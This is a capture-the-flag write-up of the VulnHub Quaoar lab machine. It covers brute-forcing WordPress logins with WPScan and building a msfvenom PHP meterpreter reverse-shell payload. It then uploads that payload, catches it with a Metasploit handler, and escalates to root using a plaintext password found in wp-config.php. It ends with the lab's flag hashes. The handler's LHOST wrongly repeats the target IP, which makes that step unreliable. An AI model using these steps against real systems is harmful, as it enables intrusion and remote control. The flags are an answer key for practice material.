## Host Discovery

The VM is nice enough to give us an IP it has picked up.

Nothing can be done with this yet. Brute-forcing faild

### 53 - DNS

Nothing special

### 80 - HTTP

http://192.168.0.122/

This looks better.

looks like we found a word press

## Exploitation

### Brute-forcing WordPress

Using WPScan i was able to bruteforce some creds to get into wordpress

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/5.png)


<br/>
admin:admin

wpuser:wpuser
<br/>


![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/6.png)

so we login as admin and have a little butch around. Standard wordpress crap here.

Now we need to get a shell on this bad boy.

### Getting a Shell

Here I originally uploaded a web shell simple-backdoor.php but it made life hard.

Use msfvenom to make our shell



`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.19 LPORT=6666 -f raw > shell.php`



we upload **shell.php**

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/7.png)

The upload fails but when looking in the Media tab we can see our payload and view it to obtain the full URL path to the shell.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/8.png)

Prepare and start the multi-handler

`use exploit/multi/handler` <br/>

`set payload php/meterpreter_reverse_tcp` <br/>

`set LHOST 192.168.0.122` <br/>

`set LPORT 6666` <br/>

`run` <br/>

now its time to trigger the payload and establish the session :D

http://192.168.0.122/wordpress/wp-content/uploads/2017/06/shell.php

visiting the page kicks things into action

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/9.png)

:) half way there 

## Privilege Escalation

so now were on the server as www-data user. I uploaded Linenum to help me find a way to get root.

https://github.com/rebootuser/LinEnum

Going through the output I see the wordpress folder and noticed the **wp-config.php** file.

Upon closer inspection things were looking good. Looks like the root user password is stored in plain-text.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/10.png)
<br/>
root
rootpassword!
<br/>
could have maybe got bruteforcing SSH .... o well nearly there.

I jumped out of the shell session and tried the found creds to login as SSH.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/11.png)

got root ðŸ˜Ž ðŸ˜Ž ðŸ˜Ž

now we can read the flag files.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/12.png)

2bafe61f03117ac66a73c3c514de796e

8e3f9ec016e3598c5eec11fd3d73f6fb

You can also read the flag just by connecting to SSH as wpadmin.
